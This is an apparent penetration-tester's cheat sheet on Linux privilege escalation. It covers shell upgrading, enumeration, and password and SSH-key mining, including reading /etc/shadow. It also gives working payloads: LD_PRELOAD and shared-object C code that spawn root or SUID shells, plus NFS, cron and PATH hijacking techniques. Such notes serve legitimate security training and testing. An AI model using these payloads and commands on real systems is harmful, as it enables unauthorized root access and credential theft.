---
layout: default
title: Linux
parent: Privilege Escalation
---

# Linux Privilege Escalation
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Upgrading Shells
Spawning shells
```shell
python -c 'import pty;pty.spawn("/bin/bash")'
```
```shell
echo os.system('/bin/bash')
```
```shell
/bin/sh -i
```

Spawning shells and maintaining euid and groups
```shell
python -c 'import os,pty; os.setresuid(new_id,new_id,new_id); pty.spawn("/bin/bash")'
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setreuid(1001,1001);
    setegid(1001);
    system("/bin/sh");
    return 0;
}
```
- Without:
    - Pre: &nbsp; `uid=1000(<u1>) gid=1000(<g1>) euid=1001(<u2>) groups=1001(<g2>),1000(<g1>)`
    - Post: `uid=1000(<u1>) gid=1000(<g1>)                 groups=1000(<g1>)`
- With:
    - Pre: &nbsp; `uid=1000(<u1>) gid=1000(<g1>) euid=1001(<u2>) groups=1001(<g2>),1000(<g1>)`
    - Post: `uid=1001(<u2>) gid=1000(<g1>)                 groups=1001(<g2>),1000(<g1>)`

Pseudo terminal
```shell
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <cols>
```

---

## Enumeration Scripts
[LinEnum.sh](https://github.com/rebootuser/LinEnum)
```shell
./LinEnum.sh -r report -e /tmp/ -t
```
- `-s`: supply current user password to check permissions
- `-k <keyword>`: search .conf and .log files for keyword

[LinuxPrivChecker.py](https://github.com/sleventyeleven/linuxprivchecker)
```shell
python linuxprivchecker.py
```

[unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
```shell
unix-privesc-check {standard | detailed}
```
- `standard` - speed-optimised check
- `detailed` - same as standard, but also checks perms of open file handles and called files (slow)

---

## Daemons

---

## Kernel

---

## Vulnerable Software Running as Different User
Check what software is installed and whether they have vulnerabilities
```shell
dpkg -l
yum list installed
rpm -qa
```

---

## Password Mining
### Logs
Check if passwords are incorrectly stored in logs (may have weak file permissions)
```shell
grep -RiIn passw /var/log/
```

---

### Memory
If application runs in the same user context, you have access to its memory and can either dump memory or directly search it to find plaintext passwords

GDB
```shell
gdb -p <pid>
info proc mappings
dump memory <out file> <start mem region> <stop mem region>
```

gcore
```shell
gcore -o <out file> <pid>
```

---

### History
Check for user command history, e.g. Bash
```shell
cat ~/.bash_history
```

---

### Configuration Files
General Search
```shell
grep -RiIn passw / 2>/dev/null
```

Common examples
- OpenVPN
    - Allows storing of credentials for automated authentication processes
- Irssi
    - Allows storing of credentials for IRC service automation

---

## Sudo
### Shell Escape Sequences/Abuse Functionality
Check what the user can run using sudo
```shell
sudo -l
cat /etc/sudoers
```

Some programs have shell escape sequences
- Check [GTFOBins](https://gtfobins.github.io/)
- Google around as GTFOBins doesn't capture everything, e.g.
    - Apache2 can be used to read files (unintended - will give error that includes file contents)
    ```shell
    sudo apache2 -f <file>
    ```

---

### LD_LIBRARY_PATH/LD_PRELOAD
- Environment variables
- `LD_LIBRARY_PATH` list of directories from which ELF binaries are searched at execution-time
- `LD_PRELOAD` user-specified list of additional ELF shared objects to be loaded before all others
- Not respected in secure-execution mode, which is activated if:
    - The processes real (uid) and effective user IDs (euid) differ, or the real (gid) and effective group IDs (egid) differ
    - A process with a non-root uid executed a binary that granted permitted or effective capabilities (effective capabilities are what a process can do and permitted capabilities are the capabilities a process is allowed to have, if it requests them with the appropriate call)
    - A Linux Security Module (LSM) has enabled the mode

Check if sudo has the ability to preserve environment variables
```shell
sudo -l
```
- Check for `env_keep+=LD_LIBRARY_PATH` or `env_keep+=LD_PRELOAD`

Exploit by compiling a Shared Object (.so) file e.g.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");  # or LD_LIBRARY_PATH as needed
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- Set `LD_PRELOAD` or `LD_LIBRARY_PATH` (whichever is used) to point to the .so file and run the program
- i.e. `sudo LD_PRELOAD=<so file path> <program>`

---

## NFS
Check if root squashing is disabled `no_root_squash`
```shell
cat /etc/exports   # Locally
showmount -e <ip>  # Remotely
```

Exploit by mounting NFS share, placing an executable on the share as root, setting suid permissions and running the file on the NFS server
- [nfsshell](https://github.com/NetDirect/nfsshell)

---

## Cron
- User-level at /var/spool/cron/crontabs/
- System-level at /etc/crontab

### Path
If the $PATH env var (seen within the crontab schedule file) can be redefined, you can compile a payload and place it in the identified path and wait for crontab to run the file

---

### Wildcards
Bash supports [globbing](http://tldp.org/LDP/abs/html/globbingref.html) (filename expansion), with alphabetical order results:
    - `*` wild card 0-n chars
    - `?` wild card 1 char
    - `[]` character lists
    - `^` match negation
    - `{}` list of matching patterns

If cron job uses globbing, can place a file which will take precendent over the intended file

---

### File Overwrite
If files executed as part of cron job are modifiable, they can be replaced with a payload
```shell
ls -l <file>
```

---

## File Permissions
### SUID/SGID Binaries
- Files with permission of `4XXX` (SUID)
- Files with permission of `2XXX` (SGID)

#### Shared Object Notation
- Shared object `.so` files are the Linux equivalent of Windows `.dll` files which contain reusable routines, exposed via an exports table as functions (symbols)
- Loaded within the context of an existing process
- Either statically or dynamically linked

Check for missing Shared Objects
```shell
strace <executable file> 2>&1 | grep -iE "open|access|no such file"
```
- Check if you can write to the location where the missing file should be

Compile .so file and place it in the necessary location, e.g.
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

---

#### Symlink
Check whether there is a reference to another file or symbolic link and whether it exists and place the payload there if you have write access
```shell
ls -l <path>
```

---

#### Evnironment Variables
- Executable running as root may use the $PATH variable via `system()`, `popen()`, `execlp()`, `execvp()`, `execvpe()`, etc.
- Can check using
    - Decompilation/disassembly
    - Strings

```shell
find / -type f -perm -04000 -ls 2>/dev/null  # All SUID files
find / -type f -perm -02000 -ls 2>/dev/null  # All SGID files
```

Exploit by placing the payload in a location in $PATH which precedes all other defined paths

---

### Startup Scripts

---

### Configuration Files

---

## OS
Distribution details
```shell
cat /proc/version
cat /etc/issue
```

Kernel
```shell
uname -a
```

## Users
```shell
id                   # Who are we?
cat /etc/passwd      # Legacy password management?
cat /etc/shadow      # Shadow access?
cat /etc/group       # Groups
sudo -l              # Sudo permissions
cat /etc/sudoers
env                  # Environment variables
cat ~/.bash_history  # History
cat ~/.*_history
w                    # Who else is logged in?
who
last                 # Last logged in users
```

SSH keys
```shell
ls -alR ~/.ssh/
cat ~/.ssh/*
ls -alR /etc/ssh/
cat /etc/ssh/*
```

---

## Applications
Running services
```shell
ps -ef  # standard syntax
ps aux  # BSD syntax
```

Installed applications
```shell
ls -al /usr/bin
ls -al /sbin
dpkg -l  # Debian and derivatives
rpm -qa  # Red Hat, Fedora, CentOS, etc.
ls -al /var/cache/apt/archives
ls -al /var/cache/yum
```

---

## File system
Check home directories
```shell
ls -alR /root/
ls -alR /home/
```

Configs
```shell
find /etc/ -iname *.conf -exec ls -al {} \;
find /opt/ -iname *.conf -exec ls -al {} \;
```

Cron jobs
```shell
crontab -l
ls -al /etc/cron* 
cat /etc/cron* 
```

SUID/SGID
```shell
find / -perm -g=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

Capabilities
```shell
getcap -r / 2>/dev/null
```

Files modified in last _n_ days
```shell
find / -type f -mtime -<days> -printf "%M %u %g %TR %TD %p\n" 2>/dev/null
find / -type f -mtime -<days> -exec ls -al {} \; 2>/dev/null  # Slower due to subshells spawning
```

Files modified between dates
```shell
find / -typef -newermt 'YYYY-MM-DD' ! -newermt 'YYYY-MM-DD'
```

Readable files in /etc/
```shell
find /etc/ -readable -type f 2>/dev/null
```

Writable files in /etc/ - check if can alter settings
```shell
find /etc/ -writable -type f 2>/dev/null
```

Writable/executable directories (/tmp, /var/tmp and /dev/shm are standard)
```shell
find / -writable -type d 2>/dev/null
find / -executable -type d 2>/dev/null
find / -writable -executable -type d 2>/dev/null
```

What files are being accessed?
```shell
lsof -i
lsof -i :<port>
```
- `-i` can take `[46][protocol][@hostname|hostaddr][:service|port]` (where `[46]` determines IPv4/6)

Log files
```shell
find /etc/ -type f -iname "*log" 2>/dev/null
find /var/ -type f -iname "*log" 2>/dev/null
ls -al /var/log/
```

Look for passwords in file system (takes ages)
```shell
grep -iR pass /
```

Mounted file systems
```shell
mount
df
```

Unmounted file systems
```shell
cat /etc/fstab
```

---

## Networking
NIC(s) and other networks
```shell
ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/networks
```

```shell
netstat -antup  # Network connections
iptables -L     # Packet filtering and NAT
route           # Routing
lsof -i         # Communications with other users and hosts
arp             # ARP cache
```

DNS
```shell
cat /etc/resolv.conf
dnsdomainname
hostname
```

Packet sniffing
```shell
tcpdump -i <interface>
tcpdump tcp dst <ip> <port>
```

---

## Kernel exploits
[Dirty Cow](https://dirtycow.ninja/)
- < 4.8.0-26.28 for Ubuntu 16.10
- < 4.4.0-45.66 for Ubuntu 16.04 LTS
- < 3.13.0-100.147 for Ubuntu 14.04 LTS
- < 3.2.0-113.155 for Ubuntu 12.04 LTS
- < 3.16.36-1+deb8u2 for Debian 8
- < 3.2.82-1 for Debian 7
- < 4.7.8-1 for Debian unstable 4.8

---

## References
- <https://github.com/sagishahar/lpeworkshop>
- <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
- <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method3upgradingfromnetcatwithmagic>
- <https://blog.pentests.pl>